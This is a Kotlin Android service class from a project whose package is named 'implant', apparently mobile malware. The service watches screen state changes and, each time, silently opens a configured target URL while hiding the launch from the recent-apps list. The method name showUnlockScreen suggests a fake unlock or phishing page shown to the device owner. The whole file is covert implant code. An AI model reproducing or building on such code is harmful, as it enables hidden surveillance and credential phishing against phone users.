package com.cooperthecoder.implant

import android.app.IntentService
import android.content.Intent
import android.net.Uri
import android.util.Log
import java.text.DateFormat
import java.util.*

class ScreenWatcherService : IntentService(TAG) {

    companion object {
        private val TAG = ScreenWatcherService::class.java.name

        const val EXTRA_TIMESTAMP = "timestamp"
        const val EXTRA_SCREEN_STATE = "screen_state"
    }

    override fun onHandleIntent(intent: Intent) {
        val screenState = intent.getStringExtra(EXTRA_SCREEN_STATE)
        val timestamp = intent.getLongExtra(EXTRA_TIMESTAMP, 0)
        updateScreenState(screenState, timestamp)
        showUnlockScreen()
    }

    private fun showUnlockScreen() {
        val intent = Intent(Intent.ACTION_VIEW, Uri.parse(Config.TARGET_URL_FOR_OPEN))
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
        startActivity(intent)
    }

    private fun formatDate(timeMillis: Long) = DateFormat.getDateTimeInstance().format(Date(timeMillis))

    private fun updateScreenState(screenState: String, timestamp: Long) {
        val changed = SharedPreferencesQuery.updateScreenState(this, screenState, timestamp)
        if (changed) {
            val changeTime = formatDate(timestamp)
            Log.d(TAG, "Screen state changed at $changeTime to $screenState")
        } else {
            Log.d(TAG, "Failed to update screen state.")
        }
    }
}
